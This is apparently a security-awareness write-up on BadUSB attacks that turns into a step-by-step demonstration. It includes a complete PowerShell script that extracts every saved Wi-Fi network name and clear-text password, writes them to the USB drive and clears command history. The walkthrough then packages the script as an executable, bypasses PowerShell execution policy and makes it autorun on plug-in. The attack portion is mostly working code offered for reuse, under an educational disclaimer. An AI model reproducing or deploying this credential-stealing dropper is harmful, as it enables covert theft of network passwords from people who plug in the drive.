Title: USB Security Demonstration – BadUSB Techniques

Author: Samuel Cesar 

Role: Cyber Security Professional

Date: March 2026

Description:

Demonstration of BadUSB techniques for educational and cybersecurity awareness purposes.

Check my docx with the same name available for a walkthrough with images and more intuitive.

--------------------------------------------------

OVERVIEW

This document provides an overview of USB-based attack techniques for cybersecurity awareness. It demonstrates how malicious USB devices, also known as BadUSB, can emulate trusted devices to perform unauthorized actions and highlights the risks they pose in both corporate and home environments.

--------------------------------------------------

INTRODUCTION TO BADUSB ATTACKS

Definition:
BadUSB attacks involve reprogramming USB device firmware to perform malicious or unintended actions.

Capabilities:
- Functions as a trusted device (keyboard, network adapter, or storage device)
- Can automatically execute commands or payloads
- Bypasses traditional security controls

Attack Vectors:
- Delivers malicious payloads
- Opens backdoors
- Exfiltrates sensitive data

--------------------------------------------------

WHAT IS A BADUSB ATTACK?

- Reprogrammed USB firmware mimics legitimate devices
- Executes commands, redirects network traffic, or runs malware
- Bypasses security by appearing as a trusted device

--------------------------------------------------

HOW BADUSB ATTACKS WORK

- Firmware Reprogramming: Modifies USB device functionality
- Device Emulation: Mimics keyboards, network interfaces, or storage devices
- Payload Execution: Runs pre-programmed scripts or malware automatically

--------------------------------------------------

TYPES OF BADUSB ATTACKS

- Keyboard Emulation: Automatically types commands
- Network Interface Emulation: Redirects or hijacks traffic
- Mass Storage Exploits: Runs hidden scripts or delivers malware

--------------------------------------------------

USB RUBBER DUCKY

The USB Rubber Ducky is a penetration testing tool that emulates a keyboard (HID device) and executes scripts automatically when connected.

Key Features:
- Acts as a HID keyboard
- Uses Ducky Script for payloads
- Cross-platform compatibility
- Payloads stored on MicroSD
- Plug-and-play execution

Common Uses:
- Credential Harvesting
- Backdoor installation
- HID injection testing
- System manipulation
- Multi-Platform attacks

--------------------------------------------------

DEMONSTRATION

Turning a Rubber Ducky into a generic USB flash drive.

Step 1 – Preparation
- Format the USB drive for a clean walkthrough
- Rename the USB drive for easy identification

Step 2 – Tool Setup
Download and install SamLogic USB AutoRun Creator:
https://en.softonic.com/download/usb-autorun-creator/windows/post-download

Install PS2EXE module (PowerShell as Administrator):
Install-Module ps2exe

Step 3 – PowerShell Script:
```
$targetLabel = "usb-name-here"

$volume = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }

if ($volume) {
    $driveLetter = $volume.DriveLetter + ":\"
    $usbPath = "$driveLetter$env:username.txt"
    $baseDestinationDir = $driveLetter
    Write-Output "Drive letter found: $driveLetter"
} else {
    Write-Error "Drive with label '$targetLabel' not found."
    exit
}

$wifiData = @()

$profiles = netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+'

foreach ($profile in $profiles) {
    $wlan = $profile.Matches.Value.Trim()

    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
    $password = if ($passw) { $passw.Matches.Value.Trim() } else { "No Password Found" }

    $wifiData += [PSCustomObject]@{
        Username = $env:username
        Profile  = $wlan
        Password = $password
    }
}

$jsonBody = $wifiData | ConvertTo-Json -Depth 3

$jsonBody | Out-File -FilePath $usbPath -Encoding UTF8

Clear-History

exit
```
--------------------------------------------------

Note:
Read and understand each line of the script before using it.

Step 4 – Convert Script to Executable

Save the script as:
Fsociety.ps1

Convert using:
Invoke-PS2EXE .\FSociety.ps1 FSociety.exe

Important:
Consistent naming is required for proper execution.

If execution is restricted, run:
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

Step 5 – Create Autorun

Open SamLogic USB AutoRun Creator:

 1 - Select the .exe file
 
 2 - Select the USB drive
 
 3 - Click Create

--------------------------------------------------

TESTING

- Unplug and plug the USB drive again
- A CMD window will briefly open and close

Go to the USB folder and check the results.

In this demonstration, the script stores Wi-Fi network names and passwords in a .txt file.

--------------------------------------------------

DISCLAIMER

This project is for educational and cybersecurity awareness purposes only.

It demonstrates how BadUSB techniques could be used in real-world attack scenarios if proper security controls are not implemented.

This highlights the importance of protecting systems against unauthorized USB devices in both corporate and home environments.
